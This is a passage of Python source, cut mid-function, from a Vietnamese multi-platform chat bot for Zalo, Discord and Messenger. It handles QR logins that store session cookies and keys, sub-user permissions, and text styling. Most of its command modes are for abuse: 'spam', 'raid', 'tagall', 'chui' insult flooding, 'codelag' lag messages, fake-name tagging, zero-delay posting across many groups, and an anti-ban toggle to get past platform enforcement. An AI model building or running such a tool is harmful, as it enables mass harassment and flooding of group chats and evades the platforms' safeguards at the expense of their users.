                        _send_reply(
                            f"📱 ĐÃ NHẬN DIỆN QUÉT MÃ QR BỞI: {d_name}!\n"
                            "👉 Hãy bấm nút [Đăng nhập / Xác nhận] trên màn hình điện thoại của bạn...",
                            broadcast_all_accs=False,
                            reply_color_mode="word_rainbow"
                        )
                except Exception:
                    pass

            try:
                ok_qr, res_qr = login_qr_with_unique_imei(
                    callback=_qr_cb,
                    region="sg_vip",
                    db_path=DB_PATH,
                    reuse_unscanned=not force_new,
                )
                if ok_qr and isinstance(res_qr, dict):
                    u_info = res_qr.get("user_info") or {}
                    uid_new = str(u_info.get("uid") or "").strip()
                    dname_new = str(u_info.get("name") or f"Zalo_{uid_new[-4:]}").strip()
                    imei_new = str(res_qr.get("imei") or "").strip()
                    ck_new = res_qr.get("cookies") or {}
                    enk_new = str(res_qr.get("zpw_enk") or "").strip()
                    ua_new = str(res_qr.get("user_agent") or "").strip()
                    pc_new = str(res_qr.get("pc_name") or "Windows 11 Pro (Singapore)").strip()
                    new_acc_id = sync_zalo_account_to_web_db(
                        uid=uid_new,
                        display_name=dname_new,
                        imei=imei_new,
                        cookies_dict=ck_new,
                        zpw_enk=enk_new,
                        user_agent=ua_new,
                        pc_name=pc_new,
                        owner_tg_id=ROOT_ADMIN_ID,
                    )
                    _send_reply(
                        f"✅ ĐĂNG NHẬP QR ZALO PC THÀNH CÔNG ({APP_AUTHOR})!\n"
                        f"• Tài khoản: {dname_new} (UID: {uid_new} • Acc #{new_acc_id})\n"
                        f"• Máy tính: {pc_new} (Giữ sống 24/7 & Đồng bộ sang Telegram Bot thành công!)\n"
                        f"👉 Giờ Acc '{dname_new}' có thể gõ trực tiếp .menu, .n, .g, .sticker, .nhaygiaitan ngay trên Zalo!",
                        broadcast_all_accs=False,
                        reply_color_mode="word_rainbow"
                    )
            except Exception:
                pass

        _PRIORITY_CMD_EXECUTOR.submit(_zalo_direct_qr_login_worker)
        log_system_command(acc_id, thread_id, sender_id, text, "Tạo ảnh Mã QR Zalo PC thật trực tiếp trên Zalo (Kết nối đồng bộ Tele)")
        return True

    if cmd_token in ("addnhay", "addngon", "addfile", "themfile", "upfile"):
        f_type = "ngon" if cmd_token == "addngon" else "nhay"
        type_lbl = "FILE NGÔN (Nguyên đoạn)" if f_type == "ngon" else "FILE NHÂY (Từng dòng)"
        fname = ""
        raw_c = ""

        # Hỗ trợ kéo trả lời (Reply) vào 1 File .txt hoặc 1 tin nhắn văn bản trên Zalo rồi gõ .addnhay [ten.txt] / .addngon [ten.txt] / .addfile [ten.txt]
        quote_info = ZaloStickerMakerEngine.extract_quote_sticker_or_media(
            raw_msg_obj, zalo_client=zalo_client if platform == "zalo" else None, thread_id=thread_id
        )
        q_obj_raw = (raw_msg_obj or {}).get("quote") if isinstance(raw_msg_obj, dict) else None
        quoted_text_msg = ""
        if isinstance(q_obj_raw, dict):
            quoted_text_msg = str(q_obj_raw.get("msg") or q_obj_raw.get("content") or q_obj_raw.get("title") or "").strip()
            if quoted_text_msg.startswith("{"):
                quoted_text_msg = ""

        if "|" in arg_body:
            f_part, c_part = arg_body.split("|", 1)
            fname = f_part.strip() or f"{f_type}_{int(time.time())}.txt"
            raw_c = c_part.strip().replace(";", "\n") if f_type == "nhay" else c_part.strip()
        elif quote_info and quote_info.get("kind") == "file_url":
            fname = arg_body.strip() or quote_info.get("filename") or f"{f_type}_{int(time.time())}.txt"
            raw_b_file, _ = ZaloStickerMakerEngine.fetch_media_from_url_or_path(quote_info["url"])
            if raw_b_file:
                raw_c = raw_b_file.decode("utf-8", errors="ignore").strip()
        elif quoted_text_msg:
            fname = arg_body.strip() or f"{f_type}_{int(time.time())}.txt"
            raw_c = quoted_text_msg.replace(";", "\n") if f_type == "nhay" else quoted_text_msg
        else:
            parts_af = arg_body.strip().split(None, 1)
            if len(parts_af) == 2 and parts_af[0].lower().endswith(".txt"):
                fname = parts_af[0].strip()
                raw_c = parts_af[1].strip().replace(";", "\n") if f_type == "nhay" else parts_af[1].strip()
            else:
                fname = f"{f_type}_{int(time.time())}.txt"
                raw_c = arg_body.strip().replace(";", "\n") if f_type == "nhay" else arg_body.strip()

        if not raw_c:
            _send_reply(
                f"📂 CÁCH THÊM {type_lbl} THẲNG TRÊN ZALO:\n"
                f"• Cách 1: Gõ .{cmd_token} ten_file.txt | Câu 1 ; Câu 2 ; Câu 3\n"
                f"• Cách 2: Gửi file .txt hoặc đoạn văn vào Zalo ➔ Kéo trả lời (Reply) ➔ Gõ .{cmd_token} ten_file.txt",
                broadcast_all_accs=False
            )
            return True
        if not fname.lower().endswith(".txt"):
            fname += ".txt"
        save_p = os.path.join(UPLOAD_DIR, f"{int(time.time())}_{os.path.basename(fname)}")
        cleaned_c = clean_corrupted_shortcuts(raw_c)
        with open(save_p, "w", encoding="utf-8") as wf:
            wf.write(cleaned_c)
        parsed_f = parse_file_stream_fast(save_p, strip_numbers=True)
        l_cnt = parsed_f.get("line_count", len(parsed_f.get("lines", [])))
        conn = db()
        conn.execute(
            "INSERT INTO files (filename, filepath, lines_count, created_at, file_type) VALUES (?, ?, ?, ?, ?)",
            (fname, save_p, l_cnt, time.time(), f_type),
        )
        conn.commit()
        conn.close()
        all_f = get_ordered_files_with_display_num()
        new_num = all_f[-1]["display_num"] if all_f else 1
        with SYSTEM_CFG_LOCK:
            SYSTEM_RUNTIME_CONFIG["selected_file"] = fname
            SYSTEM_RUNTIME_CONFIG.setdefault("selected_file_by_acc", {})[str(acc_id)] = fname
            if f_type == "nhay":
                SYSTEM_RUNTIME_CONFIG["selected_nhay_file"] = fname
                SYSTEM_RUNTIME_CONFIG.setdefault("selected_nhay_by_acc", {})[str(acc_id)] = fname
            else:
                SYSTEM_RUNTIME_CONFIG["selected_ngon_file"] = fname
                SYSTEM_RUNTIME_CONFIG.setdefault("selected_ngon_by_acc", {})[str(acc_id)] = fname
        _send_reply(
            f"✅ ĐÃ THÊM THẲNG TRÊN ZALO & KÍCH HOẠT {type_lbl} SỐ #{new_num}: {fname} ({l_cnt} dòng)!\n"
            f"👉 Đã tự động chọn làm file mặc định — Gõ .{ 'n' if f_type == 'nhay' else 'g' } để chạy ngay!",
            broadcast_all_accs=False,
            reply_color_mode="word_rainbow"
        )
        log_system_command(acc_id, thread_id, sender_id, text, f"Thêm {type_lbl} #{new_num} trực tiếp trên Zalo: {fname}")
        return True

    if cmd_token in ("chophep", "capquyen", "adduser", "add", "admin"):
        if not is_true_owner:
            _send_reply("🔒 Chỉ Chủ Tài Khoản chính chủ mới có quyền cấp quyền (.cp) cho người khác!", broadcast_all_accs=False)
            return True
        _, target_mentions, _ = extract_trailing_tags_and_resolve(
            arg_body, incoming_mentions=raw_mentions,
            zalo_client=zalo_client if platform == "zalo" else None,
            group_id=thread_id if platform == "zalo" else None,
            prefix_u16_offset=prefix_u16_offset,
            discord_client=discord_client if platform == "discord" else None,
            discord_channel_id=thread_id if platform == "discord" else None,
            full_original_msg=text,
            messenger_client=messenger_client if platform == "messenger" else None,
            messenger_thread_id=thread_id if platform == "messenger" else None
        )
        if reply_target and isinstance(reply_target, dict) and reply_target.get("uid"):
            r_uid = str(reply_target["uid"]).strip()
            r_name = str(reply_target.get("name") or GLOBAL_USER_NAME_CACHE.get(r_uid) or f"User_{r_uid[-4:]}").strip()
            if r_uid and not any(str(x.get("uid")) == r_uid for x in target_mentions):
                target_mentions.append({"uid": r_uid, "id": r_uid, "name": r_name})

        added_names = []
        if target_mentions:
            for tm in target_mentions:
                t_uid = str(tm.get("uid") or tm.get("id") or "").strip()
                t_name = str(tm.get("name") or t_uid).lstrip("@").strip()
                if add_authorized_user(t_uid, t_name, acc_id):
                    added_names.append(f"{t_name} ({t_uid[-4:]})")
        elif arg_body.strip():
            raw_q = arg_body.strip().lstrip("@").strip()
            m_dc = re.match(r"^<@!?(\d+)>$", raw_q)
            if m_dc:
                raw_q = m_dc.group(1)
            if raw_q.isdigit():
                u_name = GLOBAL_USER_NAME_CACHE.get(raw_q) or f"UID_{raw_q[-4:]}"
                if add_authorized_user(raw_q, u_name, acc_id):
                    added_names.append(f"{u_name} ({raw_q[-4:]})")
            else:
                if add_authorized_user(raw_q, raw_q, acc_id):
                    added_names.append(raw_q)

        reply_txt = (
            "✅ Đã cấp quyền điều khiển TẤT CẢ các Acc cho: " + ", ".join(added_names)
            if added_names
            else "⚠️ Hãy @Tag hoặc Reply tin nhắn của người cần cấp quyền: .chophep @Tên"
        )
        _send_reply(reply_txt)
        log_system_command(acc_id, thread_id, sender_id, text, reply_txt)
        return True

    if cmd_token in ("xoaquyen", "thuhoi", "deluser", "del", "cam"):
        if not is_true_owner:
            _send_reply("🔒 Chỉ Chủ Tài Khoản chính chủ mới có quyền thu hồi quyền (.xq)!", broadcast_all_accs=False)
            return True
        if arg_body.strip().lower() in ("all", "tatca", "het"):
            remove_authorized_user("__all__")
            reply_txt = "✅ Đã thu hồi sạch 100% quyền (.cp) của tất cả người dùng phụ (Chỉ Chủ Acc được dùng lệnh)!"
        else:
            _, target_mentions, _ = extract_trailing_tags_and_resolve(
                arg_body, incoming_mentions=raw_mentions,
                zalo_client=zalo_client if platform == "zalo" else None,
                group_id=thread_id if platform == "zalo" else None,
                prefix_u16_offset=prefix_u16_offset,
                discord_client=discord_client if platform == "discord" else None,
                discord_channel_id=thread_id if platform == "discord" else None,
                full_original_msg=text
            )
            removed_names = []
            for tm in target_mentions:
                if remove_authorized_user(tm["uid"]):
                    removed_names.append(tm["name"])
            if not removed_names and arg_body.strip().isdigit():
                if remove_authorized_user(arg_body.strip()):
                    removed_names.append(arg_body.strip())
            reply_txt = ("Đã xóa quyền: " + ", ".join(removed_names)) if removed_names else "Hãy tag người cần xóa quyền: .xoaquyen @Tên"
        _send_reply(reply_txt)
        log_system_command(acc_id, thread_id, sender_id, text, reply_txt)
        return True

    if cmd_token in ("dsquyen", "listuser", "quyen"):
        users = list_authorized_users()
        if not users:
            reply_txt = "Chỉ mình chủ tài khoản đang có quyền điều khiển"
        else:
            reply_txt = "\n".join(f"• {u['name']} ({mask_sensitive_id(u['uid'], 4)})" for u in users)
        _send_reply(reply_txt)
        return True

    if cmd_token in ("delay", "tocdo", "time"):
        try:
            val_str = arg_body.strip().lower().replace("s", "")
            new_d = max(0.0, min(120.0, float(val_str)))
            cnt = update_running_tasks_config(thread_id=None, delay=new_d)
            reply_txt = f"⚡ Đã chỉnh tốc độ Delay thành {new_d}s Siêu Tốc Không Độ Trễ (Áp dụng tức thì cho {cnt} tiến trình đang chạy)!"
        except Exception:
            reply_txt = "Cú pháp đúng: .delay <số giây> (Hỗ trợ 0s / 0.0s siêu tốc trên mọi nền tảng)"
        _send_reply(reply_txt)
        log_system_command(acc_id, thread_id, sender_id, text, reply_txt)
        return True

    if cmd_token in ("mau", "color", "doimau"):
        arg_c = remove_vn_accents(arg_body.strip().lower())
        rep_cm = "word_rainbow"
        rep_fc = "red"
        if arg_c in ("rainbow", "dong", "cauvong", "line"):
            update_running_tasks_config(thread_id=None, color_mode="rainbow")
            rep_cm = "rainbow"
            reply_txt = "🎨 Đã bật phối màu Cầu Vồng theo từng dòng (.maurainbow) trên toàn hệ thống!"
        elif arg_c in ("word", "word_rainbow", "tu", "tungtu", "tungmau", ""):
            update_running_tasks_config(thread_id=None, color_mode="word_rainbow")
            rep_cm = "word_rainbow"
            reply_txt = "🌈 Đã bật phối màu Cầu Vồng Nhảy Từng Từ (.mauword) rực rỡ trên toàn hệ thống!"
        elif arg_c in ("char", "kytu", "char_rainbow", "chucai"):
            update_running_tasks_config(thread_id=None, color_mode="char_rainbow")
            rep_cm = "char_rainbow"
            reply_txt = "✨ Đã bật phối màu Cầu Vồng Nhảy Từng Ký Tự (.mauchar) siêu rực rỡ!"
        elif arg_c in ("fire", "lua", "fire_gradient"):
            update_running_tasks_config(thread_id=None, color_mode="fire_gradient")
            rep_cm = "fire_gradient"
            reply_txt = "🔥 Đã bật phối màu Lửa Hoàng Kim (Đỏ - Cam - Vàng) (.maulua)!"
        elif arg_c in ("ocean", "bien", "bang", "ocean_gradient"):
            update_running_tasks_config(thread_id=None, color_mode="ocean_gradient")
            rep_cm = "ocean_gradient"
            reply_txt = "🌊 Đã bật phối màu Đại Dương Băng Tuyết (.maubien)!"
        elif arg_c in ("royal", "hoanggia", "royal_gradient"):
            update_running_tasks_config(thread_id=None, color_mode="royal_gradient")
            rep_cm = "royal_gradient"
            reply_txt = "👑 Đã bật phối màu Hoàng Gia (Tím - Hồng - Đỏ - Vàng) (.mauhoanggia)!"
        elif arg_c in ("cyber", "neon", "neon_cyber"):
            update_running_tasks_config(thread_id=None, color_mode="neon_cyber")
            rep_cm = "neon_cyber"
            reply_txt = "⚡ Đã bật phối màu Neon Cyber 2026 (.maucyber)!"
        elif arg_c in ("random", "ngaunhien"):
            update_running_tasks_config(thread_id=None, color_mode="random")
            rep_cm = "random"
            reply_txt = "🎲 Đã bật phối màu Ngẫu Nhiên (.maurandom)!"
        elif arg_c in ("none", "tat", "off"):
            update_running_tasks_config(thread_id=None, color_mode="none")
            rep_cm = "none"
            reply_txt = "⚪ Đã tắt đổi màu chữ (.mautat)!"
        elif arg_c in ZALO_COLOR_MAP:
            c_map_id = {
                "do": "red", "red": "red", "cam": "orange", "orange": "orange",
                "vang": "yellow", "yellow": "yellow", "xanh": "green", "xanhla": "green", "green": "green",
                "xanhduong": "blue", "blue": "blue", "ngoc": "cyan", "cyan": "cyan",
                "tim": "purple", "purple": "purple", "hong": "pink", "pink": "pink"
            }.get(arg_c, "red")
            update_running_tasks_config(thread_id=None, color_mode="fixed", fixed_color=c_map_id)
            rep_cm = "fixed"
            rep_fc = c_map_id
            reply_txt = f"🎨 Đã khóa cố định màu chữ: {c_map_id.upper()} (.mau {arg_c})!"
        else:
            reply_txt = "🎨 Chọn màu Zalo VIP: .mauword | .maurainbow | .mauchar | .maulua | .maubien | .mauhoanggia | .maudo | .maucam | .mauvang | .mauxanh | .mautat"
        _send_reply(reply_txt, reply_color_mode=rep_cm, reply_fixed_color=rep_fc)
        log_system_command(acc_id, thread_id, sender_id, text, reply_txt, sender_name=sender_name)
        return True

    if cmd_token in ("icon", "emoji"):
        try:
            ic_n = max(0, min(10, int(arg_body.strip())))
            cnt_u = update_running_tasks_config(thread_id=None, icon_count=ic_n, use_emoji=(ic_n > 0))
            if ic_n == 0:
                reply_txt = f"🚫 Đã khóa .icon 0 (Tắt sạch 100% Emoji/Icon đuôi trên TẤT CẢ các nhóm & đồng bộ lên Web — Đã áp dụng cho {cnt_u} tiến trình)!"
            else:
                reply_txt = f"✨ Đã chỉnh số lượng Icon VIP: {ic_n} (Áp dụng đồng bộ lên TẤT CẢ các nhóm & Web)!"
        except Exception:
            reply_txt = "Cú pháp: .icon <số lượng từ 0 đến 10> (Gõ .icon 0 để tắt sạch icon trên mọi nhóm)"
        _send_reply(reply_txt)
        log_system_command(acc_id, thread_id, sender_id, text, reply_txt, sender_name=sender_name)
        return True

    if cmd_token in ("chuto", "heading", "chunho", "cochu", "kieuchu", "font"):
        arg_f = remove_vn_accents(arg_body.strip().lower())
        if cmd_token == "chunho" or arg_f in ("nho", "small", "small_bold", "chunho", "f13", "13"):
            update_running_tasks_config(thread_id=None, is_heading=False, font_style="small_bold")
            reply_txt = "🔤 Đã bật kiểu chữ Zalo: CHỮ NHỎ IN ĐẬM (b,f_13) trên mọi nhóm & Web!"
        elif arg_f in ("vua", "normal_bold", "f15", "15"):
            update_running_tasks_config(thread_id=None, is_heading=False, font_style="normal_bold")
            reply_txt = "🔤 Đã bật kiểu chữ Zalo: CHỮ VỪA IN ĐẬM (b,f_15) trên mọi nhóm & Web!"
        elif arg_f in ("xenke", "sole", "alternating", "alternating_bold"):
            update_running_tasks_config(thread_id=None, is_heading=True, font_style="alternating_bold")
            reply_txt = "🔤 Đã bật kiểu chữ Zalo: ĐẬM TO & NHỎ ĐAN XEN SIÊU ĐẸP (f_18 / f_13)!"
        elif arg_f in ("nghieng", "italic", "italic_bold"):
            update_running_tasks_config(thread_id=None, is_heading=True, font_style="italic_bold")
            reply_txt = "🔤 Đã bật kiểu chữ Zalo: CHỮ TO IN ĐẬM NGHIÊNG (b,i,f_18)!"
        elif arg_f in ("gachchan", "underline", "underline_bold"):
            update_running_tasks_config(thread_id=None, is_heading=True, font_style="underline_bold")
            reply_txt = "🔤 Đã bật kiểu chữ Zalo: CHỮ TO IN ĐẬM GẠCH CHÂN (b,u,f_18)!"
        elif arg_f in ("serif", "bold_serif"):
            update_running_tasks_config(thread_id=None, is_heading=True, font_style="bold_serif")
            reply_txt = "🔤 Đã bật Phông Chữ Hoàng Gia Bold Serif (𝐁𝐨𝐥𝐝 𝐒𝐞𝐫𝐢𝐟 + f_18)!"
        elif arg_f in ("sans", "bold_sans"):
            update_running_tasks_config(thread_id=None, is_heading=True, font_style="bold_sans")
            reply_txt = "🔤 Đã bật Phông Chữ Hiện Đại Bold Sans (𝗕𝗼𝗹𝗱 𝗦𝗮𝗻𝘀 + f_18)!"
        elif arg_f in ("double", "khung", "double_struck"):
            update_running_tasks_config(thread_id=None, is_heading=True, font_style="double_struck")
            reply_txt = "🔤 Đã bật Phông Chữ Khung Kép VIP (𝔻𝕠𝕦𝕓𝕝𝕖 𝕊𝕥𝕣𝕦𝕔𝕜 + f_18)!"
        elif arg_f in ("script", "nghethuat", "script_vip"):
            update_running_tasks_config(thread_id=None, is_heading=True, font_style="script_vip")
            reply_txt = "🔤 Đã bật Phông Chữ Nghệ Thuật Luxury (𝓢𝓬𝓻𝓲𝓹𝓽 𝓥𝓘𝓟 + f_18)!"
        elif arg_f in ("smallcaps", "small_caps"):
            update_running_tasks_config(thread_id=None, is_heading=True, font_style="small_caps")
            reply_txt = "🔤 Đã bật Phông Chữ Small Caps Đẳng Cấp (ꜱᴍᴀʟʟ ᴄᴀᴘꜱ + f_18)!"
        elif arg_f in ("off", "tat", "0", "thuong", "normal"):
            update_running_tasks_config(thread_id=None, is_heading=False, font_style="normal")
            reply_txt = "🔤 Đã chuyển về chữ thường mặc định trên mọi nhóm & Web!"
        else:
            update_running_tasks_config(thread_id=None, is_heading=True, font_style="big_bold")
            reply_txt = "🔤 Đã bật kiểu chữ Zalo: CHỮ TO IN ĐẬM VIP (b,f_18) trên mọi nhóm & Web!"
        _send_reply(reply_txt)
        log_system_command(acc_id, thread_id, sender_id, text, reply_txt, sender_name=sender_name)
        return True

    if cmd_token in ("antiband", "antiban"):
        on_val = arg_body.strip().lower() not in ("off", "tat", "0")
        update_running_tasks_config(antiband=on_val)
        reply_txt = "Đã BẬT Anti-Ban thông minh" if on_val else "Đã TẮT Anti-Ban"
        _send_reply(reply_txt)
        return True

    if cmd_token in ("stop", "dung", "dừng", "tat", "tắt", "off"):
        cnt_box = stop_tasks_for_thread(thread_id, acc_id=acc_id)
        log_system_command(acc_id, thread_id, sender_id, text, f"Đã dừng riêng Box {thread_id} ({cnt_box} tiến trình)")
        _send_reply(f"🛑 Đã dừng ngay lập tức lệnh đang chạy tại Box này ({cnt_box} tiến trình) — Các Box khác vẫn đang chạy bình thường!")
        return True

    if cmd_token in ("stopall", "dunghet", "tathet"):
        cnt = stop_tasks_for_thread(None, acc_id=acc_id)
        log_system_command(acc_id, thread_id, sender_id, text, f"Dừng toàn bộ tất cả các Box ({cnt} tiến trình)")
        _send_reply(f"🛑 Đã dừng toàn bộ {cnt} tiến trình đang chạy ngầm trên TẤT CẢ các Box!")
        return True

    if cmd_token in ("files", "dsfile", "listfile", "chonfile", "cf", "pickfile", "setfile", "chonnhay", "chonngon") or (cmd_token == "file" and (not arg_body.strip() or len(arg_body.strip().split()) == 1)):
        f_list = get_ordered_files_with_display_num()
        q_sel = arg_body.strip()
        if q_sel:
            rec_sel = resolve_file_record(q_sel)
            if rec_sel:
                f_cat = "nhay" if cmd_token == "chonnhay" else ("ngon" if cmd_token == "chonngon" else rec_sel.get("file_type", "nhay"))
                with SYSTEM_CFG_LOCK:
                    SYSTEM_RUNTIME_CONFIG["selected_file"] = rec_sel["filename"]
                    SYSTEM_RUNTIME_CONFIG.setdefault("selected_file_by_acc", {})[str(acc_id)] = rec_sel["filename"]
                    if f_cat == "nhay" or cmd_token in ("chonnhay", "chonfile", "file", "cf"):
                        SYSTEM_RUNTIME_CONFIG["selected_nhay_file"] = rec_sel["filename"]
                        SYSTEM_RUNTIME_CONFIG.setdefault("selected_nhay_by_acc", {})[str(acc_id)] = rec_sel["filename"]
                    if f_cat == "ngon" or cmd_token in ("chonngon", "chonfile", "file", "cf"):
                        SYSTEM_RUNTIME_CONFIG["selected_ngon_file"] = rec_sel["filename"]
                        SYSTEM_RUNTIME_CONFIG.setdefault("selected_ngon_by_acc", {})[str(acc_id)] = rec_sel["filename"]
                msg_out = (
                    f"✅ CHẾ ĐỘ CHỌN FILE: Đã chọn File #{rec_sel['display_num']} — {rec_sel['filename']} ({rec_sel['lines_count']} dòng | Loại: {f_cat.upper()})!\n"
                    f"👉 Gõ ngay .n, .g, .gif, .treodo, .damau, .word, .nhaypoll, .tenbox, .xa, .combo để chạy file vừa chọn!"
                )
                _send_reply(msg_out, reply_color_mode="word_rainbow")
                log_system_command(acc_id, thread_id, sender_id, text, f"Chọn file #{rec_sel['display_num']}: {rec_sel['filename']}")
                return True
        with SYSTEM_CFG_LOCK:
            cur_nhay = SYSTEM_RUNTIME_CONFIG.get("selected_nhay_by_acc", {}).get(str(acc_id)) or SYSTEM_RUNTIME_CONFIG.get("selected_nhay_file") or "nhay.txt"
            cur_ngon = SYSTEM_RUNTIME_CONFIG.get("selected_ngon_by_acc", {}).get(str(acc_id)) or SYSTEM_RUNTIME_CONFIG.get("selected_ngon_file") or "ngon.txt"
        if not f_list:
            msg_out = "Chưa có file .txt nào. Gõ .addnhay ten.txt | Câu 1 ; Câu 2 hoặc .addngon ten.txt | Đoạn văn để thêm!"
        else:
            lines_f = [
                f"📂 CHẾ ĐỘ CHỌN FILE NHÂY & FILE NGÔN (.TXT):",
                f"• File Nhây đang chọn: [{cur_nhay}] | File Ngôn đang chọn: [{cur_ngon}]"
            ]
            for f in f_list:
                ft_tag = "NHÂY" if f.get("file_type") != "ngon" else "NGÔN"
                mark = "✅" if f["filename"].lower() in (str(cur_nhay).lower(), str(cur_ngon).lower()) else "•"
                lines_f.append(f"{mark} #{f['display_num']} [{ft_tag}]: {f['filename']} ({f['lines_count']} dòng)")
            lines_f.append("👉 Gõ: .chonfile <số> | .chonnhay <số> | .chonngon <số> | .addnhay | .addngon")
            msg_out = "\n".join(lines_f)
        _send_reply(msg_out)
        log_system_command(acc_id, thread_id, sender_id, text, "Hiển thị Chế Độ Chọn File")
        return True

    mode_map = {
        "spam": "fast",
        "fast": "fast",
        "nhanh": "fast",
        "nhay": "treo_nhay",
        "treonhay": "treo_nhay",
        "treo_nhay": "treo_nhay",
        "nall": "treo_nhay",
        "ngon": "treo_ngon",
        "treongon": "treo_ngon",
        "treo_ngon": "treo_ngon",
        "gall": "treo_ngon",
        "raid": "raid_mode",
        "auto": "auto_shuffle",
        "chao": "chao_mode",
        "file": "file_cmd",
        "chay": "file_cmd",
        "tag": "fast",
        "all": "treo_nhay",
        "tagall": "treo_nhay",
        "anall": "treo_nhay",
        "tagallan": "treo_nhay",
        "antan": "treo_nhay",
        "tagan": "treo_nhay",
        "antag": "treo_nhay",
        "hientag": "treo_nhay",
        "nhaytag": "treo_nhay",
        "treodo": "treo_ngon",
        "damau": "treo_ngon",
        "gif": "zalo_gif",
        "treosticker": "treo_sticker",
        "word": "treo_nhay",
        "nhaygiaitan": "nhay_giaitan",
        "poll": "nhay_poll",
        "nhaypoll": "nhay_poll",
        "nhaytyping": "nhay_typing",
        "nhaynamebox": "nhay_namebox",
        "nhaynen": "nhay_theme",
        "treonen": "nhay_theme",
        "nhaytodo": "zalo_todo",
        "nhaybank": "zalo_cardbank",
        "combo3": "combo_lien_thanh",
        "xa": "sieu_xa_nhieu_nhom",
        "xaall": "sieu_xa_nhieu_nhom",
        "sieuxa": "sieu_xa_nhieu_nhom",
        "xanhom": "sieu_xa_nhieu_nhom",
        "combo": "combo_lien_thanh",
        "battrinh": "battrinh_all_box",
        "treoso": "treo_so",
        "so": "treo_so",
        "sotag": "so_tag",
        "sotagfaketen": "so_tag_faketen",
        "codelag": "code_lag",
        "lag": "code_lag",
        "nhay2c": "nhay_2c",
        "2c": "nhay_2c",
        "ideamess": "idea_mess",
        "chui": "idea_mess",
        "nhayicon": "nhay_icon",
        "nhaytagfaketen": "nhay_fake_ten",
        "faketen": "nhay_fake_ten",
        "nhaytop": "nhay_top",
        "sotop": "nhay_top",
        "treotop": "nhay_top",
        "reostr": "reo_story",
        "story": "reo_story",
    }

    direct_file_num = None
    if cmd_token.isdigit():
        chosen_mode = "file_cmd"
        direct_file_num = cmd_token
    elif cmd_token in mode_map:
        chosen_mode = mode_map[cmd_token]
    else:
        return False

    with SYSTEM_CFG_LOCK:
        delay_val = float(SYSTEM_RUNTIME_CONFIG["delay"])
        color_mode = SYSTEM_RUNTIME_CONFIG["color_mode"]
        fixed_color = SYSTEM_RUNTIME_CONFIG["fixed_color"]
        use_emoji = bool(SYSTEM_RUNTIME_CONFIG["use_emoji"])
        icon_count = int(SYSTEM_RUNTIME_CONFIG["icon_count"])
        is_heading = bool(SYSTEM_RUNTIME_CONFIG["is_heading"])
        antiband_flag = bool(SYSTEM_RUNTIME_CONFIG["antiband"])

    # Bước 1: Bóc tách thông số chọn nhóm (allnhom, 200nhom, nhom=1-200, nhom=1,2,3) & tagall trước khi tách @Tag
    pre_cleaned_arg, group_spec_mode, group_spec_val, inline_tag_all_1 = extract_multigroup_spec_and_clean_body(
        arg_body, cmd_token=cmd_token
    )

    cleaned_body, extracted_mentions, extracted_tag_all = extract_trailing_tags_and_resolve(
        pre_cleaned_arg,
        incoming_mentions=raw_mentions,
        zalo_client=zalo_client if platform == "zalo" else None,
        group_id=thread_id if platform == "zalo" else None,
        prefix_u16_offset=prefix_u16_offset,
        discord_client=discord_client if platform == "discord" else None,
        discord_channel_id=thread_id if platform == "discord" else None,
        full_original_msg=text,
        messenger_client=messenger_client if platform == "messenger" else None,
        messenger_thread_id=thread_id if platform == "messenger" else None
    )

    # Bước 2: Bóc tách lần 2 phòng trường hợp thông số nhom=... nằm kẹp giữa nội dung và @Tag
    cleaned_body, group_spec_mode_2, group_spec_val_2, inline_tag_all_2 = extract_multigroup_spec_and_clean_body(
        cleaned_body, cmd_token=cmd_token
    )
    if group_spec_mode == "current" and group_spec_mode_2 != "current":
        group_spec_mode = group_spec_mode_2
        group_spec_val = group_spec_val_2

    if inline_tag_all_1 or inline_tag_all_2 or cmd_token in ("all", "tagall", "anall", "tagallan"):
        extracted_tag_all = True

    if group_spec_mode != "current":
        target_obj = FullConversationAutoScanner.resolve_target_groups_from_spec(
            platform=platform,
            current_thread_id=thread_id,
            is_group_default=is_group,
            spec_mode=group_spec_mode,
            spec_val=group_spec_val
        )

    is_auto_shuffle = (chosen_mode == "auto_shuffle")
    if cmd_token == "treodo":
        color_mode = "fixed"
        fixed_color = "red"
    elif cmd_token in ("damau", "gif", "word"):
        color_mode = "word_rainbow"
    if chosen_mode == "nhay_poll":
        # Treo Poll liên hoàn 0.0s không thời gian nghỉ!
        delay_val = 0.0
    if chosen_mode in ("raid_mode", "sieu_xa_nhieu_nhom"):
        chosen_mode = "treo_nhay" if chosen_mode == "raid_mode" else "sieu_xa_nhieu_nhom"
        delay_val = 0.0
        color_mode = "word_rainbow"
        is_heading = True
    elif chosen_mode == "auto_shuffle":
        chosen_mode = "treo_nhay"
    elif chosen_mode == "chao_mode":
        chosen_mode = "treo_nhay"
        if not cleaned_body.strip():
            cleaned_body = "Chào cả nhà ngày mới rực rỡ nhé; Chúc anh em trong box luôn vui vẻ đỉnh cao; Hệ thống Hệ Thống điểm danh siêu tốc"

    if platform == "zalo" and (extracted_mentions or extracted_tag_all):
        target_obj[0]["type"] = "group"

    first_line_part, sep_nl, rest_lines_part = cleaned_body.partition("\n")
    tokens = first_line_part.split()
    consumed = 0
    file_query = direct_file_num

    if chosen_mode == "file_cmd":
        chosen_mode = "treo_nhay"
        if not file_query and tokens and not sep_nl:
            file_query = tokens[0]
            consumed = 1

    for tk in tokens[consumed:]:
        tk_low = tk.lower()
        if tk_low.startswith("delay=") or tk_low.startswith("d="):
            try:
                delay_val = max(0.0, float(tk_low.split("=", 1)[1].replace("s", "")))
                consumed += 1
            except Exception:
                break
        elif tk_low.startswith("color=") or tk_low.startswith("mau="):
            c_val = tk_low.split("=", 1)[1]
            if c_val in ("rainbow", "word_rainbow", "fire_gradient", "ocean_gradient", "royal_gradient", "random", "none"):
                color_mode = c_val
            elif c_val in ZALO_COLOR_MAP:
                color_mode = "fixed"
                fixed_color = c_val
            consumed += 1
        elif tk_low.startswith("icon="):
            try:
                icon_count = max(0, int(tk_low.split("=", 1)[1]))
                use_emoji = (icon_count > 0)
                update_running_tasks_config(thread_id=None, icon_count=icon_count, use_emoji=use_emoji)
                consumed += 1
            except Exception:
                break
        elif tk_low in ("nhay", "treonhay", "treo_nhay"):
            chosen_mode = "treo_nhay"
            consumed += 1
        elif tk_low in ("ngon", "treongon", "treo_ngon"):
            chosen_mode = "treo_ngon"
            consumed += 1
        elif tk_low in ("fast", "nhanh"):
            chosen_mode = "fast"
            consumed += 1
        elif tk_low.startswith("file="):
            file_query = tk.split("=", 1)[1]
            consumed += 1
        else:
            break

    if consumed > 0:
        rem_first = " ".join(tokens[consumed:]).strip()
        remaining_content = (f"{rem_first}\n{rest_lines_part}" if rem_first else rest_lines_part) if sep_nl else rem_first
    else:
        remaining_content = cleaned_body.strip("\r\n")

    blocks = []
    matched_rec = None
    if file_query:
